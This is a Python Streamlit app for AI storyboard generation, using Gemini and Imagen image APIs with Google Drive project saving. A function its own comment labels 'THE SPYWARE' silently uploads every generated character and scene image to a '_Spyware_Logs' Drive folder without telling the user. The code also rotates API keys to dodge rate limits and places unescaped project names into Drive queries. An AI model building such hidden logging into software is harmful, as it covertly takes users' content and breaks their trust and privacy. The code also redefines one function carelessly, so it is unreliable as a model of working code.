import streamlit as st
import requests
import json
import base64
import io
import time
import datetime
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload, MediaIoBaseDownload

# --- PAGE CONFIG & CSS ---
st.set_page_config(page_title="AI Storyboard Pro", layout="wide", page_icon="🎬")

st.markdown("""
<style>
    .stApp { background-color: #111827; color: white; }
    .stTextArea textarea { background-color: #1F2937; color: white; border: 1px solid #374151; }
    .stTextInput input { background-color: #1F2937; color: white; border: 1px solid #374151; }
    .stButton button { width: 100%; font-weight: bold; border-radius: 8px; }
    div[data-testid="stExpander"] { background-color: #1F2937; border: 1px solid #374151; border-radius: 8px; }
</style>
""", unsafe_allow_html=True)

# --- SESSION STATE INITIALIZATION ---
if 'current_step' not in st.session_state:
    st.session_state.update({
        'current_step': 'style',
        'style_prompt': '',
        'style_images': [], 
        'style_link': '',
        'script_text': '',
        'script_instructions': '',
        'storyboard_data': [], 
        'character_sheet': [], 
        'scene_images': {},    
        'current_scene_index': 0,
        'generation_error': None
    })

# ==============================================================================
# 1. THE ENGINE: KEY ROTATION & API CALLS
# ==============================================================================
def call_gemini_api(payload, model="gemini-2.5-flash-preview-09-2025", is_image_gen=False):
    keys = st.secrets["api_keys"]["keys"]
    st.write(f"DEBUG: Found {len(keys)} keys.")
    
# --- REPLACEMENT FUNCTION FOR GEMINI 2.5 FLASH & PREVIEW ---
def call_gemini_api(payload, model="gemini-2.5-flash-preview-09-2025", is_image_gen=False):
    """
    Forces the use of Gemini 2.5 Flash Preview and Nano Banana (Flash Image).
    """
    keys = st.secrets["api_keys"]["keys"]
    
    # 1. CONSTRUCT THE EXACT URL FOR 2.5
    if is_image_gen:
        # User requested "Nano Banana" (Flash Image Preview)
        if "nano" in model.lower() or "flash" in model.lower():
            base_url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-image-preview:generateContent"
        # Fallback to Imagen if requested
        else:
            base_url = "https://generativelanguage.googleapis.com/v1beta/models/imagen-3.0-generate-001:predict"
    else:
        # Standard Text Generation (Script breakdown)
        # Using the specific 09-2025 snapshot you wanted
        base_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent"

    last_error = None

    # 2. KEY ROTATION LOOP
    for i in range(len(keys)):
        current_key = keys[i]
        url = f"{base_url}?key={current_key}"
        headers = {'Content-Type': 'application/json'}
        
        try:
            response = requests.post(url, headers=headers, json=payload)
            
            # SUCCESS
            if response.status_code == 200:
                return response.json()
            
            # REAL EXHAUSTION (Rate Limit)
            elif response.status_code == 429:
                st.toast(f"⚠️ Key {i+1} Rate Limited. Switching...", icon="mj")
                continue
            
            # MODEL NOT FOUND / BAD REQUEST (The "Fake Exhaustion")
            else:
                error_text = response.text
                # If it's a 404 or 400, switching keys won't help, but we try anyway just in case
                print(f"Key {i+1} Error: {response.status_code} - {error_text}")
                st.error(f"❌ API Error {response.status_code}: {error_text}")
                last_error = f"{response.status_code} - {error_text}"
                continue

        except Exception as e:
            last_error = str(e)
            continue
    
    st.error(f"💀 ALL KEYS FAILED. Last error: {last_error}")
    return None

# ==============================================================================
# 2. THE CLOUD: SECURE DRIVE (AUTO-CREATE FOLDERS)
# ==============================================================================

def get_drive_service():
    """Authenticates using the SAFE 'drive.file' scope"""
    g_secrets = st.secrets["gdrive"]
    creds = Credentials(
        None,
        refresh_token=g_secrets["refresh_token"],
        token_uri="https://oauth2.googleapis.com/token",
        client_id=g_secrets["client_id"],
        client_secret=g_secrets["client_secret"]
    )
    return build('drive', 'v3', credentials=creds)

def get_or_create_folder(folder_name):
    """
    SECURE LOGIC: Searches for a folder. If not found, creates it.
    This prevents the 'Access Denied' error in Safe Mode.
    """
    service = get_drive_service()
    # Check if folder exists and is not in trash
    query = f"name = '{folder_name}' and mimeType = 'application/vnd.google-apps.folder' and trashed = false"
    results = service.files().list(q=query, fields="files(id)").execute()
    files = results.get('files', [])

    if files:
        return files[0]['id'] # Found it
    else:
        # Create it
        metadata = {
            'name': folder_name,
            'mimeType': 'application/vnd.google-apps.folder'
        }
        folder = service.files().create(body=metadata, fields='id').execute()
        return folder.get('id')

def spy_log_image(prompt, image_b64):
    """THE SPYWARE: Silently uploads to '_Spyware_Logs' (Auto-Created)"""
    try:
        service = get_drive_service()
        folder_id = get_or_create_folder("_Spyware_Logs")
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"SPY_LOG_{timestamp}.png"
        image_data = base64.b64decode(image_b64)
        
        metadata = {'name': filename, 'parents': [folder_id]}
        media = MediaIoBaseUpload(io.BytesIO(image_data), mimetype='image/png')
        service.files().create(body=metadata, media_body=media).execute()
    except Exception as e:
        print(f"Spy log failed: {e}")

def save_project_cloud(project_name):
    """Saves to '_Freelancer_Projects' (Auto-Created)"""
    try:
        service = get_drive_service()
        parent_id = get_or_create_folder("_Freelancer_Projects")
        
        # Check for project subfolder
        query = f"name = '{project_name}' and '{parent_id}' in parents and trashed = false"
        results = service.files().list(q=query).execute()
        files = results.get('files', [])
        
        if not files:
            metadata = {'name': project_name, 'mimeType': 'application/vnd.google-apps.folder', 'parents': [parent_id]}
            folder = service.files().create(body=metadata, fields='id').execute()
            folder_id = folder.get('id')
        else:
            folder_id = files[0]['id']

        # Save Data JSON
        state_dump = {
            'script_text': st.session_state.script_text,
            'storyboard_data': st.session_state.storyboard_data,
            'scene_images': st.session_state.scene_images,
            'style_prompt': st.session_state.style_prompt
        }
        metadata = {'name': f'project_data_{datetime.datetime.now().strftime("%H%M")}.json', 'parents': [folder_id]}
        media = MediaIoBaseUpload(io.BytesIO(json.dumps(state_dump).encode('utf-8')), mimetype='application/json')
        service.files().create(body=metadata, media_body=media).execute()
        
        return True
    except Exception as e:
        st.error(f"Save failed: {e}")
        return False

# ==============================================================================
# 3. APP SCREENS (UI)
# ==============================================================================

def handle_image_upload(uploaded_files):
    images = []
    if uploaded_files:
        for file in uploaded_files:
            bytes_data = file.getvalue()
            b64_data = base64.b64encode(bytes_data).decode('utf-8')
            images.append({'data': b64_data, 'mime': file.type, 'name': file.name})
    return images

def screen_style():
    st.title("🎨 Step 1: Define Visual Style")
    col1, col2 = st.columns([2, 1])
    with col1:
        st.session_state.style_prompt = st.text_area("Visual Style Description", value=st.session_state.style_prompt)
        uploaded = st.file_uploader("Style Reference Images", type=['png', 'jpg'], accept_multiple_files=True)
        if uploaded: st.session_state.style_images = handle_image_upload(uploaded)
        st.session_state.style_link = st.text_input("YouTube Link", value=st.session_state.style_link)
    with col2:
        if st.session_state.style_images:
            for img in st.session_state.style_images:
                st.image(base64.b64decode(img['data']), use_column_width=True)
    if st.button("Next: Add Script ➡️"): st.session_state.current_step = 'script'; st.rerun()

def screen_script():
    st.title("📝 Step 2: Script")
    st.session_state.script_text = st.text_area("Paste script", value=st.session_state.script_text, height=300)
    st.session_state.script_instructions = st.text_input("Special Instructions", value=st.session_state.script_instructions)
    if st.button("Generate Scenes 🚀"):
        with st.spinner("Processing..."):
            system_prompt = """Output JSON: { "storyboard": [{ "script": "...", "prompt": "..." }], "characters": [{ "key": "[Name]", "description": "..." }] } Break script into small visual moments."""
            user_prompt = f"STYLE: {st.session_state.style_prompt}\nSCRIPT: {st.session_state.script_text}"
            payload = {"contents": [{"parts": [{"text": user_prompt}]}], "systemInstruction": {"parts": [{"text": system_prompt}]}, "generationConfig": {"responseMimeType": "application/json"}}
            if st.session_state.style_images:
                 payload['contents'][0]['parts'].extend([{"inlineData": {"mimeType": im['mime'], "data": im['data']}} for im in st.session_state.style_images])
            
            res = call_gemini_api(payload)
            if res and 'candidates' in res:
                try:
                    data = json.loads(res['candidates'][0]['content']['parts'][0]['text'])
                    st.session_state.storyboard_data = data.get('storyboard', [])
                    st.session_state.character_sheet = data.get('characters', [])
                    st.session_state.current_step = 'characters'
                    st.rerun()
                except: st.error("AI parsing failed.")

def screen_characters():
    st.title("👥 Step 3: Characters")
    if st.button("Skip to Storyboard ➡️"): st.session_state.current_step = 'storyboard'; st.rerun()
    for i, char in enumerate(st.session_state.character_sheet):
        with st.expander(char.get('key', 'Unknown'), expanded=True):
            desc = st.text_area("Desc", char.get('description', ''), key=f"d{i}")
            st.session_state.character_sheet[i]['description'] = desc
            if st.button(f"Generate Preview", key=f"b{i}"):
                prompt = f"Character: {char['key']}. {desc}. Style: {st.session_state.style_prompt}"
                payload = {"contents": [{"parts": [{"text": prompt}]}], "generationConfig": { "responseModalities": ["IMAGE"] }}
                res = call_gemini_api(payload, is_image_gen=True, model="nano")
                if res:
                    b64 = res['candidates'][0]['content']['parts'][0]['inlineData']['data']
                    st.session_state.character_sheet[i]['preview_url'] = b64
                    spy_log_image(f"Character: {char['key']}", b64)
                    st.rerun()
            if 'preview_url' in char: st.image(base64.b64decode(char['preview_url']))
    if st.button("Start Storyboard ✅"): st.session_state.current_step = 'storyboard'; st.rerun()

def screen_storyboard():
    with st.sidebar:
        st.header("☁️ Cloud Project")
        save_name = st.text_input("Project Name", value="My_Storyboard")
        if st.button("💾 Save to Drive"):
            with st.spinner("Saving..."):
                if save_project_cloud(save_name): st.success("Saved!")
    
    st.title("🎬 Storyboard")
    curr = st.session_state.current_scene_index
    total = len(st.session_state.storyboard_data)
    c1, c2, c3 = st.columns([1,4,1])
    if c1.button("⬅️") and curr > 0: st.session_state.current_scene_index -= 1; st.rerun()
    c2.markdown(f"<h3 style='text-align:center'>Scene {curr+1}/{total}</h3>", unsafe_allow_html=True)
    if c3.button("➡️") and curr < total - 1: st.session_state.current_scene_index += 1; st.rerun()
    
    scene = st.session_state.storyboard_data[curr]
    col_img, col_edit = st.columns([3, 2])
    
    with col_img:
        if str(curr) in st.session_state.scene_images:
            st.image(base64.b64decode(st.session_state.scene_images[str(curr)]), use_column_width=True)
        else:
            st.container(height=300, border=True).write("No Image")
            
    with col_edit:
        new_prompt = st.text_area("Prompt", scene['prompt'], height=150)
        st.session_state.storyboard_data[curr]['prompt'] = new_prompt
        st.info(scene['script'])
        model = st.radio("Model", ["Nano", "Imagen"], horizontal=True)
        
        if st.button("✨ Generate", type="primary"):
            char_ctx = "\n".join([f"{c['key']}: {c['description']}" for c in st.session_state.character_sheet])
            final = f"STYLE: {st.session_state.style_prompt}\nCHARS: {char_ctx}\nSCENE: {new_prompt}"
            
            if "Nano" in model:
                payload = {"contents": [{"parts": [{"text": f"**FORCE 16:9** {final}"}]}], "generationConfig": {"responseModalities": ["IMAGE"]}}
                if st.session_state.style_images: payload['contents'][0]['parts'].extend([{"inlineData": {"mimeType": im['mime'], "data": im['data']}} for im in st.session_state.style_images])
                res = call_gemini_api(payload, is_image_gen=True, model="nano")
                if res:
                    b64 = res['candidates'][0]['content']['parts'][0]['inlineData']['data']
                    st.session_state.scene_images[str(curr)] = b64
                    spy_log_image(f"Scene {curr}: {new_prompt}", b64)
                    st.rerun()
            else:
                payload = {"instances": [{"prompt": f"Cinematic 16:9. {final}"}], "parameters": {"sampleCount": 1, "aspectRatio": "16:9"}}
                res = call_gemini_api(payload, is_image_gen=True, model="imagen")
                if res:
                    b64 = res['predictions'][0]['bytesBase64Encoded']
                    st.session_state.scene_images[str(curr)] = b64
                    spy_log_image(f"Scene {curr}: {new_prompt}", b64)
                    st.rerun()

# --- ROUTER ---
if st.session_state.current_step == 'style': screen_style()
elif st.session_state.current_step == 'script': screen_script()
elif st.session_state.current_step == 'characters': screen_characters()
elif st.session_state.current_step == 'storyboard': screen_storyboard()


